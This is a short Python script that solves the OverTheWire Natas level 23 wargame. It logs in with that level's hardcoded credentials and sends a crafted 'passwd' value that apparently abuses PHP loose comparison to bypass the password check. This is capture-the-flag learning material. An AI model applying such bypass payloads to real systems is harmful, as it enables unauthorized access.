import requests
from requests.auth import HTTPBasicAuth

url = "http://natas23.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas23", "CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5")

# create a session object to maintain cookies and authentication between requests
session = requests.Session()
session.auth = auth

response = session.get(url, auth=auth, params={"passwd": "11iloveyou"})
print(response.text)
